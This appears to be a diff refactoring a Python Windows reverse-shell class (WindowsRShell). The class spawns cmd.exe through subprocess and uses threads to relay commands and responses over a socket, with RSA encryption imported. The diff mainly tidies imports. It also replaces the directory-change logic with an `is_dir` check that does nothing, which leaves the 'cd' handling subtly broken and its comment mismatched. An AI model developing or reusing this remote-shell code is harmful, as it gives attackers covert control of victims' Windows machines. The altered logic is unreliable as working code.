@@ -10,8 +10,7 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 import inspect
-import os
-import pathlib
+from pathlib import Path
 try:
     from . import plugins
 except ImportError:
@@ -19,7 +18,7 @@ except ImportError:
 import socket
 import subprocess
 from sys import exit
-import threading
+from threading import Thread
 
 
 class WindowsRShell:
@@ -75,12 +74,10 @@ class WindowsRShell:
                     if "cd " in command.decode() or "cd\n" in command.decode():
                         command = command.decode().strip()
                         if len(command) == 2:
-                            p = pathlib.Path("~")
+                            p = Path("~")
                         else:
-                            p = pathlib.Path(command[3:])
-                        try:
-                            os.chdir(p.resolve())
-                        except Exception:
+                            p = Path(command[3:])
+                        if p.is_dir():
                             # not a directory -- let shell output error message
                             pass
 
@@ -121,10 +118,10 @@ class WindowsRShell:
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT,
                                   stdin=subprocess.PIPE)
-        s2p_thread = threading.Thread(target=self.readCommands, args=[cmdexe])
+        s2p_thread = Thread(target=self.readCommands, args=[cmdexe])
         s2p_thread.daemon = True
         s2p_thread.start()
-        p2s_thread = threading.Thread(target=self.sendResponses, args=[cmdexe])
+        p2s_thread = Thread(target=self.sendResponses, args=[cmdexe])
         p2s_thread.daemon = True
         p2s_thread.start()
         try:
